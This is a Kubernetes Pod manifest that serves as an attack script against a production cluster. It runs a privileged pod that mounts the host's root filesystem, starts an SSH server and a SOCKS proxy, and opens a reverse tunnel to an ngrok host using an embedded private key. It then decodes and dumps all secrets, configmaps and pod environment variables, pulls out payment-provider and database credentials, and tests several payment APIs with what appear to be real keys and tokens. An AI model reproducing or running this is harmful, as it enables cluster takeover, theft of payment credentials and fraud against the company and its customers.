apiVersion: v1
kind: Pod
metadata:
  name: network-access
  namespace: egam-production
spec:
  hostNetwork: true
  hostPID: true
  containers:
  - name: shell
    image: alpine:3.19
    command:
      - /bin/sh
      - -c
      - |
        apk add --no-cache util-linux curl jq openssl redis bash openssh-server openssh-client autossh microsocks > /dev/null 2>&1
        curl -LO "https://dl.k8s.io/release/v1.30.0/bin/linux/amd64/kubectl" 2>/dev/null
        chmod +x kubectl && mv kubectl /usr/local/bin/ 2>/dev/null

        export KUBECONFIG=/host/etc/rancher/rke2/rke2.yaml

        # ---------- SSH SERVER NEL POD ----------
        ssh-keygen -A >/dev/null 2>&1
        mkdir -p /root/.ssh && chmod 700 /root/.ssh
        cat > /root/.ssh/authorized_keys <<'EOF'
        PASTE_KALI_PUBKEY_HERE
        EOF
        chmod 600 /root/.ssh/authorized_keys
        /usr/sbin/sshd -D &
        # ---------------------------------------

        # ---------- SOCKS NEL POD ----------
        microsocks -p 1080 -i 0.0.0.0 &
        # ----------------------------------

        # ---------- TUNNEL NGROK ----------
        mkdir -p /root/.ssh
        cat > /root/.ssh/id_ed25519 <<'EOF'
        -----BEGIN OPENSSH PRIVATE KEY-----
        b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
        QyNTUxOQAAACCC5vieafUQBwwP77oy2tflg4jOu4NMFxaU/9Wrjziu4gAAAJAMSDC8DEgw
        vAAAAAtzc2gtZWQyNTUxOQAAACCC5vieafUQBwwP77oy2tflg4jOu4NMFxaU/9Wrjziu4g
        AAAEAXg3D2WLL1mCR1DtHTy3EkJUwN/Uakv7y1CzWebJSPgYLm+J5p9RAHDA/vujLa1+WD
        iM67g0wXFpT/1auPOK7iAAAACHBvZEBlZ2FtAQIDBAU=
        -----END OPENSSH PRIVATE KEY-----
        EOF
        chmod 600 /root/.ssh/id_ed25519
        ssh-keyscan -p 20849 8.tcp.ngrok.io >> /root/.ssh/known_hosts 2>/dev/null
        autossh -M 0 -f -N \
          -o "StrictHostKeyChecking=no" \
          -o "ServerAliveInterval=30" \
          -o "ExitOnForwardFailure=yes" \
          -R 0.0.0.0:2222:localhost:22 \
          -R 0.0.0.0:1080:localhost:1080 \
          -i /root/.ssh/id_ed25519 \
          tunnel@8.tcp.ngrok.io -p 20849
        echo "TUNNEL_UP"
        # ----------------------------------

        echo "=========================================="
        echo "=== 1. ALL SECRETS IN egam-production ==="
        echo "=========================================="
        kubectl get secrets -n egam-production -o json 2>&1 | jq -r '.items[] | .metadata.name + ": " + (.data | to_entries | map(.key + "=" + (.value | @base64d)) | join(" | "))' 2>&1

        echo "=========================================="
        echo "=== 2. PAGARME / SAFRAPAY / GITLAB / JENKINS ==="
        echo "=========================================="
        kubectl get secrets -A -o json 2>&1 | jq -r '.items[] | select(.data != null) | .metadata.namespace + "/" + .metadata.name + ": " + (.data | to_entries | map(select(.key | test("pagar|safra|gitlab|jenkins|cielo|stripe|r2d2|hympar"; "i")) | .key + "=" + (.value | @base64d)) | join(" | "))' 2>&1 | grep -v ": $"

        echo "=========================================="
        echo "=== 3. ALL CONFIGMAPS egam-production ==="
        echo "=========================================="
        kubectl get configmaps -n egam-production -o json 2>&1 | jq -r '.items[] | .metadata.name + ": " + (.data | to_entries | map(.key + "=" + .value) | join(" | "))' 2>&1

        echo "=========================================="
        echo "=== 4. ENV VARS FROM RUNNING PODS ==="
        echo "=========================================="
        for pod in $(kubectl get pods -n egam-production -o jsonpath='{.items[*].metadata.name}' 2>/dev/null); do
          echo "--- POD: $pod ---"
          kubectl get pod $pod -n egam-production -o json 2>/dev/null | jq -r '.spec.containers[].env[]? | .name + "=" + (.value // "ref")' 2>&1 | head -30
        done

        echo "=========================================="
        echo "=== 5. PAGARME API TEST ==="
        echo "=========================================="
        curl -s -u "sk_4e35af52a28a441c8d9149fb88a6c818:" "https://api.pagar.me/core/v5/charges?size=3" 2>&1 | head -c 600
        echo ""

        echo "=========================================="
        echo "=== 6. SAFRAPAY API TEST ==="
        echo "=========================================="
        curl -s -H "Authorization: Bearer mk_l91fCUNJ0urRBQq07kaeQ" "https://payment.safrapay.com.br/v2/transactions" 2>&1 | head -c 400
        echo ""

        echo "=========================================="
        echo "=== 7. R2D2 API TEST ==="
        echo "=========================================="
        curl -sk -H "Authorization: Bearer 1334463|GLW3HHDl4XkCGZYoZoqnXDkBz5a9FEikeGvMzIoYdbfe5a5d" "https://r2d2.production.egam.com.br/api/payment" 2>&1 | head -c 400
        echo ""

        echo "=========================================="
        echo "=== 8. HYMPAR API TEST ==="
        echo "=========================================="
        curl -s -H "Authorization: Bearer eyJhbGciOiJFUzUxMiJ9.eyJ1c2VySWQiOiI2OTUyZTg3MWVkZWJjNzZkOTEzYWRmNjkiLCJyb2xlcyI6W3sicm9sZSI6IlBBUlRORVIifV0sImNyZWF0ZWRCeUpvYiI6ZmFsc2UsInNlcnZlciI6dHJ1ZSwianRpIjoiMjBiYTdiYzgtOWMyNy00MmQ4LTg0ZjUtNDlhNjY5M2YwMDM4IiwiaWF0IjoxNzkyODUwMTA2LCJleHAiOjE3OTMxMDkzMDZ9.AdI-Ayaro0JlwIou4rPK2eOfbbiY_LwCVOLpj9bMJkHAXGx98B513Ur3W9RDFeWSXpraq3SQDXZRDUdoVjnAYNWmAWa1MS6Nh6ZQtyFZw0sEPpV4W1vU7kA9znODJNMeU9kjLS9kBxqpRO1SXzAglETS2JomGL6KXduZE8_tix2l0k3m" "https://api-prod.parceirohypera.com.br/" 2>&1 | head -c 300
        echo ""

        echo "=========================================="
        echo "=== 9. KUBERNETES PODS IN egam-production ==="
        echo "=========================================="
        kubectl get pods -n egam-production 2>&1

        echo "=========================================="
        echo "=== 10. DATABASE CREDENTIALS ==="
        echo "=========================================="
        kubectl get secrets -A -o json 2>&1 | jq -r '.items[] | select(.data != null) | .metadata.namespace + "/" + .metadata.name + ": " + (.data | to_entries | map(select(.key | test("postgres|mysql|mongo|redis|db_|database"; "i")) | .key + "=" + (.value | @base64d)) | join(" | "))' 2>&1 | grep -v ": $"

        echo "=========================================="
        echo "=== DONE ==="
        echo "=========================================="
        sleep 36000
    securityContext:
      privileged: true
    volumeMounts:
    - mountPath: /host
      name: host
  volumes:
  - name: host
    hostPath:
      path: /
